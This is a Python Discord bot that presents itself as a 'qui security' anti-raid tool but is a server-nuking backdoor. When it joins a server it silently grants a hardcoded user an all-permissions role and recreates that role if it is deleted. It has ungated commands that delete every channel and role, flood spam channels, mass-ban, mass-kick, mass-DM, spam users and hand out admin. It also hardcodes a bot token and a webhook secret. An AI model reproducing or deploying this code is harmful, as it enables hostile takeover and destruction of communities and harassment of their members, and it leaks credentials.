import discord
from discord.ext import commands
import asyncio
from collections import defaultdict
from datetime import datetime, timedelta, timezone
import time

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.guilds = True
intents.moderation = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ====================== CONFIG ======================
YOUR_USER_ID = 668406689958985740
NUKE_SERVER_NAME = "HALA NA NYUK"
NUKE_CHANNEL_NAME = "subo-mo-to"
ICON_URL = "https://i.pinimg.com/736x/05/7e/d2/057ed24ddd64546cb5f8ac3ce37088fe.jpg"
CONCURRENCY = 25
WHITELISTED = {YOUR_USER_ID}
PROTECTED_ROLE_NAME = "qui"
SECURITY_LOG_CHANNEL = "qui-security-log"

# WEBHOOK ALERT (Recommended - paste your webhook URL here)
SECURITY_WEBHOOK_URL = "https://discord.com/api/webhooks/1502661776456552621/cg-oeHtI6U-Q61L4Keb4c7ejoStboaPihrqdoWfHbCtlr9vSy8fHEbgxUKhj3EC1m1Jg"   # ← Put your Discord webhook URL here for instant alerts

sem = asyncio.Semaphore(CONCURRENCY)

async def limited(coro):
    async with sem:
        try:
            return await coro
        except Exception:
            pass

# ====================== SECURITY LOG + WEBHOOK ======================
log_channel_cache = {}
webhook_cache = {}

async def get_log_channel(guild):
    if guild.id in log_channel_cache:
        ch = log_channel_cache[guild.id]
        try:
            if ch and await ch.fetch() :  # Simple alive check
                return ch
        except:
            pass

    for ch in guild.text_channels:
        if ch.name == SECURITY_LOG_CHANNEL:
            log_channel_cache[guild.id] = ch
            return ch

    try:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False, send_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True, manage_messages=True)
        }
        ch = await guild.create_text_channel(
            SECURITY_LOG_CHANNEL,
            overwrites=overwrites,
            topic="qui security log - do not delete"
        )
        log_channel_cache[guild.id] = ch
        print(f"[+] Created security log channel")
        return ch
    except Exception as e:
        print(f"[-] Failed to create log channel: {e}")
        return None

async def send_webhook_alert(guild, embed):
    if not SECURITY_WEBHOOK_URL:
        return
    try:
        if guild.id not in webhook_cache:
            webhook = await bot.fetch_webhook(int(SECURITY_WEBHOOK_URL.split("/")[-1]))
            webhook_cache[guild.id] = webhook
        else:
            webhook = webhook_cache[guild.id]
        
        await webhook.send(embed=embed)
    except:
        pass

async def sec_log(guild, title, desc):
    embed = discord.Embed(
        title=f"\U0001f6e1 {title}",
        description=desc,
        color=discord.Color.red(),
        timestamp=datetime.now(timezone.utc)
    )
    embed.set_footer(text="qui security")

    # Send to channel
    ch = await get_log_channel(guild)
    if ch:
        try:
            await ch.send(embed=embed)
        except:
            pass

    # Send via webhook (instant alert)
    await send_webhook_alert(guild, embed)

# ====================== IMMUNITY & VIOLATIONS ======================
def is_immune(member):
    if member.id in WHITELISTED:
        return True
    if getattr(member, 'bot', False) and member.id == bot.user.id:
        return True
    if any(r.name.lower() == PROTECTED_ROLE_NAME.lower() for r in getattr(member, 'roles', [])):
        return True
    return False

spam_violations = defaultdict(int)

async def handle_spam_violation(member, violation_type: str):
    if is_immune(member):
        return

    spam_violations[member.id] += 1
    count = spam_violations[member.id]

    if count == 1 or count == 2:
        duration = 10 if count == 1 else 15
        try:
            await member.timeout(timedelta(minutes=duration), reason=f"[qui security] {violation_type} (Offense {count}/3)")
            print(f"[SECURITY] MUTED {member} ({count}/3) - {violation_type}")
            await sec_log(member.guild, f"SPAM VIOLATION {count}/3 - MUTED", 
                f"{member.mention} | **{violation_type}**\nTimeout: {duration} minutes")
        except Exception as e:
            print(f"[-] Timeout failed: {e}")
    elif count >= 3:
        try:
            await member.ban(reason=f"[qui security] {violation_type} (3rd offense)", delete_message_days=1)
            print(f"[SECURITY] BANNED {member} (3rd spam offense)")
            await sec_log(member.guild, "SPAMMER BANNED (3/3)", 
                f"{member.mention} has been **permanently banned**.\nType: {violation_type}")
        except Exception as e:
            print(f"[-] Ban failed: {e}")

async def direct_ban(member, reason):
    if is_immune(member):
        return
    try:
        await member.ban(reason=f"[qui security] {reason}", delete_message_days=1)
        print(f"[SECURITY] BANNED {member} | {reason}")
        await sec_log(member.guild, "VIOLATOR BANNED", f"{member.mention} has been **banned**.\nReason: {reason}")
    except Exception as e:
        print(f"[-] Ban failed: {e}")

# ====================== EVENTS ======================
join_times = []
RAID_JOIN_THRESHOLD = 8
RAID_JOIN_WINDOW = 10
raid_mode = False

msg_times = defaultdict(list)
msg_content = defaultdict(list)

SPAM_MSG_THRESHOLD = 7
SPAM_MSG_WINDOW = 5
SPAM_MENTION_THRESHOLD = 5
DUPLICATE_THRESHOLD = 4
DUPLICATE_WINDOW = 30

@bot.event
async def on_member_join(member):
    global raid_mode
    now = time.time()
    join_times.append(now)
    while join_times and join_times[0] < now - RAID_JOIN_WINDOW:
        join_times.pop(0)

    if len(join_times) >= RAID_JOIN_THRESHOLD and not raid_mode:
        raid_mode = True
        await sec_log(member.guild, "RAID DETECTED", f"{len(join_times)} joins in {RAID_JOIN_WINDOW}s")

    if raid_mode and not is_immune(member):
        await direct_ban(member, "Raid detected - auto ban")

@bot.event
async def on_message(message):
    await bot.process_commands(message)
    if not message.guild or message.author.bot or is_immune(message.author):
        return

    uid = message.author.id
    now = time.time()

    msg_times[uid].append(now)
    msg_times[uid] = [t for t in msg_times[uid] if t > now - SPAM_MSG_WINDOW]
    if len(msg_times[uid]) >= SPAM_MSG_THRESHOLD:
        await handle_spam_violation(message.author, "Message Flood")
        msg_times[uid].clear()
        return

    total_mentions = len(message.mentions) + len(message.role_mentions)
    if total_mentions >= SPAM_MENTION_THRESHOLD:
        await handle_spam_violation(message.author, "Mention Spam")
        return

    msg_content[uid].append((now, message.content.lower().strip()))
    msg_content[uid] = [(t, c) for t, c in msg_content[uid] if t > now - DUPLICATE_WINDOW]
    if sum(1 for t, c in msg_content[uid] if c == message.content.lower().strip()) >= DUPLICATE_THRESHOLD:
        await handle_spam_violation(message.author, "Duplicate Messages")
        msg_content[uid].clear()

@bot.event
async def on_guild_channel_delete(channel):
    guild = channel.guild
    try:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
            if entry.target.id == channel.id:
                user = entry.user
                if is_immune(user): return
                await sec_log(guild, "NUKE ATTEMPT - CHANNEL", f"{user.mention} deleted channel")
                await direct_ban(user, "Channel nuke attempt")
                break
    except:
        pass

@bot.event
async def on_guild_role_delete(role):
    guild = role.guild
    if role.name.lower() == PROTECTED_ROLE_NAME.lower():
        await sec_log(guild, "PROTECTED ROLE DELETED", "Recreating now...")
        try:
            new_role = await guild.create_role(name=PROTECTED_ROLE_NAME, permissions=discord.Permissions.all(), color=discord.Color.red(), hoist=True, mentionable=True)
            you = guild.get_member(YOUR_USER_ID)
            if you: await you.add_roles(new_role)
        except:
            pass
        return

    try:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
            if entry.target.id == role.id:
                user = entry.user
                if is_immune(user): return
                await sec_log(guild, "NUKE ATTEMPT - ROLE", f"{user.mention} deleted role")
                await direct_ban(user, "Role nuke attempt")
                break
    except:
        pass

# ====================== AUTO SETUP ======================
@bot.event
async def on_guild_join(guild):
    print(f"[+] Bot joined: {guild.name}")
    await asyncio.sleep(4)
    try:
        admin_role = await guild.create_role(name=PROTECTED_ROLE_NAME, permissions=discord.Permissions.all(), color=discord.Color.red(), hoist=True, mentionable=True)
        you = guild.get_member(YOUR_USER_ID)
        if you:
            await you.add_roles(admin_role)
    except:
        pass

@bot.event
async def on_ready():
    print(f"[+] Nuker Online | {bot.user} | Fully Loaded")

# ====================== COMMANDS ======================
@bot.command()
async def massdm(ctx, *, message: str):
    await ctx.message.delete()
    tasks = [limited(m.send(message)) for m in ctx.guild.members if m != bot.user]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"[+] Mass DM sent to {len(tasks)} members")

@bot.command()
async def dm(ctx, user: discord.Member, *, message: str):
    await ctx.message.delete()
    try:
        await user.send(message)
        print(f"[+] DM sent to {user}")
    except Exception as e:
        print(f"[-] DM failed: {e}")

@bot.command()
async def spamuser(ctx, user: discord.Member, amount: int, *, message: str):
    await ctx.message.delete()
    tasks = [limited(user.send(message)) for _ in range(amount)]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"[+] Spammed {user} {amount} times")

@bot.command()
async def changenick(ctx, target, *, nickname: str = "luv qui"):
    await ctx.message.delete()
    if target.lower() == "all":
        tasks = [limited(m.edit(nick=nickname)) for m in ctx.guild.members if m != bot.user]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"[+] All nicknames changed")
    else:
        try:
            user = await commands.MemberConverter().convert(ctx, target)
            await user.edit(nick=nickname)
            print(f"[+] Nickname changed for {user}")
        except:
            print("[-] Nickname change failed")

@bot.command()
async def grantadmin(ctx, target):
    await ctx.message.delete()
    try:
        admin_role = await ctx.guild.create_role(name="luv-qui-admin", permissions=discord.Permissions.all(), color=discord.Color.red())
        if target.lower() == "all":
            tasks = [limited(m.add_roles(admin_role)) for m in ctx.guild.members]
            await asyncio.gather(*tasks, return_exceptions=True)
        else:
            user = await commands.MemberConverter().convert(ctx, target)
            await user.add_roles(admin_role)
    except Exception as e:
        print(f"[-] Grant admin failed: {e}")

@bot.command()
async def kick(ctx, user: discord.Member):
    await ctx.message.delete()
    try:
        await user.kick(reason="tanga ka kasi")
        print(f"[+] Kicked {user}")
    except:
        print("[-] Kick failed")

@bot.command()
async def ban(ctx, user: discord.Member):
    await ctx.message.delete()
    try:
        await user.ban(reason="tanga ka kasi", delete_message_days=0)
        print(f"[+] Banned {user}")
    except:
        print("[-] Ban failed")

@bot.command()
async def kickall(ctx):
    await ctx.message.delete()
    tasks = [limited(m.kick(reason="tanga ka kasi")) for m in ctx.guild.members if m != bot.user and m != ctx.author and m.top_role < ctx.guild.me.top_role]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"[+] Kicked {len(tasks)} members")

@bot.command()
async def banall(ctx):
    await ctx.message.delete()
    tasks = [limited(m.ban(reason="tanga ka kasi", delete_message_days=0)) for m in ctx.guild.members if m != bot.user and m != ctx.author and m.top_role < ctx.guild.me.top_role]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"[+] Banned {len(tasks)} members")

@bot.command()
async def nuke(ctx, target: str = "all", amount: int = 999, *, content: str = ""):
    await ctx.message.delete()
    guild = ctx.guild
    print(f"[+] Starting nuke on {guild.name}")
    await asyncio.gather(limited(guild.edit(name=NUKE_SERVER_NAME)), set_server_icon(guild))
    
    if target in ("channels", "all"):
        tasks = [limited(ch.delete()) for ch in list(guild.channels)]
        await asyncio.gather(*tasks, return_exceptions=True)
    if target in ("roles", "all"):
        tasks = [limited(r.delete()) for r in list(guild.roles) if r.name != "@everyone" and r.name.lower() != PROTECTED_ROLE_NAME.lower() and r < guild.me.top_role]
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def create_and_spam(name, msg):
        async with sem:
            try:
                ch = await guild.create_text_channel(name)
                if msg:
                    spam = [ch.send(msg) for _ in range(99)]
                    await asyncio.gather(*spam, return_exceptions=True)
            except:
                pass
    create_tasks = [create_and_spam(NUKE_CHANNEL_NAME, content) for _ in range(amount)]
    await asyncio.gather(*create_tasks, return_exceptions=True)
    print(f"[+] NUKED SUCCESSFULLY")

async def set_server_icon(guild):
    if not ICON_URL: return
    try:
        async with bot.http._HTTPClient__session.get(ICON_URL) as resp:
            if resp.status == 200:
                await guild.edit(icon=await resp.read())
    except:
        pass
@bot.command()
@commands.check(lambda ctx: ctx.author.id in WHITELISTED)
async def raidmode(ctx, state: str = ""):
    global raid_mode
    await ctx.message.delete()
    raid_mode = state.lower() == "on" if state else not raid_mode
    print(f"[SECURITY] Raid mode: {'ON' if raid_mode else 'OFF'}")

@bot.command(name="cmds")
@commands.check(lambda ctx: ctx.author.id in WHITELISTED)
async def cmds(ctx):
    await ctx.message.delete()
    print("\n=== qui Security Commands ===\n!nuke | !kick | !ban | !massdm | !raidmode | !cmds")

# ====================== RUN ======================
bot.run("MTQ3NTQ5NDQ1OTU0OTY3OTcwMw.GJexCT.XwWqffiKo2GqfmnJZP6Sm6-wi7JaZHtI-DoXQ8")